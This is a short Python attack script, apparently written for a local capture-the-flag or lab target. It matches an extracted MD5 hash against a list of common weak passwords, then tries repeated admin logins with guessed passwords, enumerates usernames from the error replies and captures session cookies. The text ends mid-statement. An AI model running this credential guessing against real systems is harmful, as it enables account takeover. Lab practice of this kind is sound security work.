import hashlib
import requests

# The extracted hash
hash_value = "7d39307ae824e70052c0aa16816a9b16"

print("="*60)
print("ANALYZING EXTRACTED HASH")
print("="*60)
print(f"Hash: {hash_value}")
print(f"Length: {len(hash_value)} characters")
print(f"Type: Likely MD5 (32 characters)")

# Try common weak passwords
test_passwords = [
    "admin", "admin123", "password", "password123", "123456", "12345678",
    "qwerty", "letmein", "welcome", "monkey", "123123", "abc123",
    "admin1", "root", "toor", "test", "test123", "changeme",
    "default", "secret", "1234", "12345", "111111", "000000",
    "P@ssw0rd", "P@ssword", "Passw0rd", "Password1", "Admin123"
]

print("\n[+] Testing common weak passwords against the hash...")
for pwd in test_passwords:
    md5_hash = hashlib.md5(pwd.encode()).hexdigest()
    if md5_hash == hash_value:
        print(f"\n[!] PASSWORD FOUND: {pwd}")
        print(f"[!] MD5('{pwd}') = {md5_hash}")
        break
else:
    print("[-] No common password matched the hash")

# Try to authenticate with some likely candidates
BASE_URL = "http://127.0.0.1:32815"
LOGIN_URL = f"{BASE_URL}/index.php"

# Let's try to authenticate with some common passwords anyway
print("\n" + "="*60)
print("ATTEMPTING AUTHENTICATION WITH LIKELY PASSWORDS")
print("="*60)

likely_passwords = [
    "admin", "admin123", "password", "password123", "P@ssw0rd", "P@ssword123"
]

session = requests.Session()
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

for pwd in likely_passwords:
    print(f"\n[+] Trying password: {pwd}")
    data = {
        "username": "admin",
        "password": pwd,
        "submit": "submit"
    }
    
    response = session.post(LOGIN_URL, data=data, headers=headers)
    response_text = response.text
    
    print(f"[+] Response: {response_text}")
    
    if "Success" in response_text:
        print(f"[!] SUCCESS! Password is: {pwd}")
        cookies = session.cookies.get_dict()
        if "PHPSESSID" in cookies:
            phpsessid = cookies["PHPSESSID"]
            print(f"[!] PHPSESSID: {phpsessid}")
            print(f"\n[!] Authentication successful!")
            print(f"Username: admin")
            print(f"Password: {pwd}")
            print(f"PHPSESSID: {phpsessid}")
            break
        else:
            print(f"[+] Authentication succeeded but no PHPSESSID cookie found")
            print(f"[+] Cookies: {cookies}")
    elif "password" in response_text:
        print(f"[-] Wrong password (username exists)")
    elif "username" in response_text:
        print(f"[-] Username doesn't exist")
else:
